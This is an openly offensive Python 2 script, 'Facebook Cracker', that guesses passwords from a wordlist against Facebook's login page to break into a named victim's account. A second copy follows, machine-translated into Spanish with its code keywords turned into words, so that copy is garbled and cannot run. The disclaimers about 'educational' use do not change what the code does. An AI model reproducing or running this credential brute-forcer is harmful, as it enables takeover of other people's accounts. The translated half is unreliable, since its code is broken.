import sys
import random
import mechanize
import cookielib

print ("Note: - This tool can crack facebook account even if you don't have the email of your victim")
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim 😊"
email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
passwordlist = str(raw_input("Enter the name of the password list file : "))
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):
try:
sys.stdout.write("\r[*] trying %s.. " % password)
sys.stdout.flush()
br.addheaders = [('User-agent', random.choice(useragents))]
site = br.open(login)
br.select_form(nr=0)
##Facebook
br.form['email'] =email
br.form['pass'] = password
br.submit()
log = br.geturl()
if log != login:
print "\n\n\n [*] Password found .. !!"
print "\n [*] Password : %s\n" % (password)
sys.exit(1)
except KeyboardInterrupt:
print "\n[*] Exiting program .. "
sys.exit(1)
def search():
global password
for password in passwords:
attack(password.replace("\n",""))
def check():
global br
global passwords
try:
br = mechanize.Browser()
cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
except KeyboardInterrupt:
print "\n[*] Exiting program ..\n"
sys.exit(1)
try:
list = open(passwordlist, "r")
passwords = list.readlines()
k = 0
while k < len(passwords):
passwords[k] = passwords[k].strip()
k += 1
except IOError:
print "\n [*] Error: check your password list path \n"
sys.exit(1)
except KeyboardInterrupt:
print "\n [*] Exiting program ..\n"
sys.exit(1)
try:
print GHT
print " [*] Account to crack : %s" % (email)
print " [*] Loaded :" , len(passwords), "passwords"
print " [*] Cracking, please wait ..."
except KeyboardInterrupt:
print "\n [*] Exiting program ..\n"
sys.exit(1)
try:
search()
attack(password)
except KeyboardInterrupt:
print "\n [*] Exiting program ..\n"
sys.exit(1)
if __name__ == '__main__':
check()
#script en python hack facebook.
#!usr/bin/python
#Facebook cracker!
#Este script esta echo solo con fines educativos.
#No ataques personas, es ilegal!
import sys
importación al azar
mecanizado de importación
Importar cookielib
GHT = '''
+=======================================+
|.......... Facebook Cracker ...........|
+---------------------------------------+
| #Autor: Ataque de Mauritania |
|#                                      |
|#Date: 02/04/2014                      |
| #Esta herramienta está hecha para pentejar. |
| #Cambiando la descripción de esta herramienta |
| No te convertirá en el codificador 😊!!! |
|#Respect Coderz 😊                    |
| #No tomo responsabilidades por el |
| uso de este programa! |
+=======================================+
|.......... Facebook Cracker ...........|
+---------------------------------------+
'''
Imprimir ′′ Nota: - Esta herramienta puede romper la cuenta de facebook incluso si no tienes el correo electrónico de tu víctima ′′
Imprime "# Pulsa CTRL+C para dejar el programa ′′
imprimir "# Usar www.graph.facebook.com para obtener más información sobre su víctima 😊"
correo electrónico = str (crudo _ entrada ("# Intro | Correo electrónico | | Número de teléfono | | Número de identificación de perfil | | Nombre de usuario |: ′′))
contraseña passwordlist str (raw raw input (′′ Introduzca el nombre del archivo de la lista de contraseñas: ′′))
Usuarios useragents [(' User-agente ', ' Mozilla / 5.0 (X participar; U; Linux i686; en-US; rv:1.9.0.1) Gecko / 2008071615 Fedora / 3.0.1-1. fc9 Firefox / 3.0.1 ')]
login = 'https://www.facebook.com/login.php?login_attempt=1'
Ataque definitivamente (contraseña):
Intentar:
Sys. Stdout. Escribe (′′ \ r [*] probando % s.. ′′ % contraseña)
Sys. Stdout. sonrojo ()
br. br. addheaders addheaders [('agente de usuario', al azar. elección (usuarios)]
sitio web = br. Abierto (inicio de sesión)
br. br. seleccionar =0) form (nr =0)
##Facebook
br. br. Formulario de ' correo electrónico ' ' =email correo electrónico
br. br. Forma ['pass']] contraseña
br. br. Presentar ()
Gente People bar. Geturl ()
si inicia sesión!= inicia sesión:
imprimir ′′ " n n n [*] n [*] Contraseña encontrada..!!"
Imprime '' n [*] Contraseña: % s n '' % (contraseña)
sys.exit(1)
Excepto el teclado:
Imprimir ′′ " n [*] Programa de salida..
sys.exit(1)
Búsqueda definitivamente ():
Contraseña global
para contraseñas en contraseñas:
ataque (contraseña. reemplazar (′′ " n ","")
Verificación definitiva ():
global br
contraseñas mundiales
Intentar:
br br mecanize. Navegador ()
cj = cookielib.LWPCookieJar()
br. br. Set _ manija) robots (Falso)
br. br. Set) manija _ equiv (Verdadero)
br. br. Set) Act _ Referee (Verdadero)
br. br. Set) manija _ redirect (True)
br.set_cookiejar(cj)
br. br. set + manivela + refrescar (mecanizar._ http. HTTPRefreshProcessor (), máximo max time= 1)
Excepto el teclado:
imprimir ′′ " n [*] programa de salida.... n ′′
sys.exit(1)
Intentar:
lista = open (contraseña, ′′ r ′′)
Contraseñas = list. readlines ()
k = 0
mientras k k len (contraseñas):
contraseñas [k]] contraseñas [k]. strip ()
k += 1
excepto IOError:
imprimir ′′ "n [*] Error : revisa la ruta de tu lista de contraseñas" n ′′
sys.exit(1)
Excepto el teclado:
imprimir ′′ " n [*] programa de salida.... n ′′
sys.exit(1)
Intentar:
Imprimir GHT
imprimir ′′ [*] Cuenta para crack: % s ′′ % (correo electrónico)
imprimir ′′ [*] Loaded :" len (contraseñas), ′′ contraseñas ′′
Imprime ′′ [*] Cracking, por favor espera..."
Excepto el teclado:
imprimir ′′ " n [*] programa de salida.... n ′′
sys.exit(1)
Intentar:
search()
Ataque (contraseña)
Excepto el teclado:
imprimir ′′ " n [*] programa de salida.... n ′′
sys.exit(1)
si __ nombre == __ '__ principal __':
cheque ()